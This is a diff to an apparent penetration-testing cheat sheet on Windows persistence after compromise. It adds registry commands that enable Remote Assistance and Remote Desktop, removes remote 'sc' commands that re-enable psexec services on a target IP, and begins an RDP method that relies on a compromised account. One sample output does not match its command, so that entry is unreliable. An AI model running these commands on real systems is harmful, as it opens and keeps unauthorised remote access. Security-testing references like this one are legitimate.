@@ -13,21 +13,21 @@ return false;
 
 Commands to run to maintain persistence after you have exploited it and are usually executed from the context of the `cmd.exe` or `command.exe` prompt.
 
+### Remote Assistance Enable
+ * **Command with arguments**: `reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fAllowToGetHelp /t REG_DWORD /d 1 /f`
+ * **Description**: **Must be admin to run this.** Enable remote assistance through adding a registry entry on the local system.
+ * **Output**:
+   * <div class="slide" style="cursor: pointer;"> **Windows 2008:** Show/Hide</div><div class="view"><code>C:\Windows\system32>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+The operation completed successfully.</code></div> 
 
-### Enable `psexec`
-The [`psexec` tool](http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx) executes processes on other systems over a network. Most systems now disable the "clipbook" which `psexec` required. According to Val Smith's and Colin Ames' [BlackHat 2008 presentation (page 50)](http://www.blackhat.com/presentations/bh-usa-08/Smith_Ames/BH_US_08_Smith_Ames_Meta-Post_Exploitation.pdf), you can re-enable the sub-systems needed to use `psexec` using the `sc` commands below.
-    
-<pre>
-c:\> net use \\[TargetIP]\ipc$ username /user:password
-c:\> sc \\[TargetIP] config netdde start= auto
-c:\> sc \\[TargetIP] config netddedsdm start= auto
-c:\> sc \\[TargetIP] config clipsrv start= auto
-c:\> sc \\[TargetIP] start netdde
-c:\> sc \\[TargetIP] start netddedsdm
-c:\> sc \\[TargetIP] start clipsrv
-</pre>
+### Remote Desktop Enable - Method 1
+ * **Command with arguments**: `reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f`
+ * **Description**: **Must be admin to run this.** Enable remote desktop through adding a registry entry on the local system.
+ * **Output**:
+   * <div class="slide" style="cursor: pointer;"> **Windows 2008:** Show/Hide</div><div class="view"><code>C:\Windows\system32>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+The operation completed successfully.</code></div> 
 
-### Enable Remote Desktop
+### Remote Desktop Enable - Method 2
 Remote Desktop allows a remote user to receive a graphical "desktop" of the target (compromised) system. According to Val Smith's and Colin Ames' [BlackHat 2008 presentation (page 53)](http://www.blackhat.com/presentations/bh-usa-08/Smith_Ames/BH_US_08_Smith_Ames_Meta-Post_Exploitation.pdf), you can remotely enable remote desktop using the commands below.
 
  1. On the compromised system, create a file named `fix_ts_policy.ini` containing the contents below. Change the *"hacked_account"* value to the account you have compromised on the remote system.
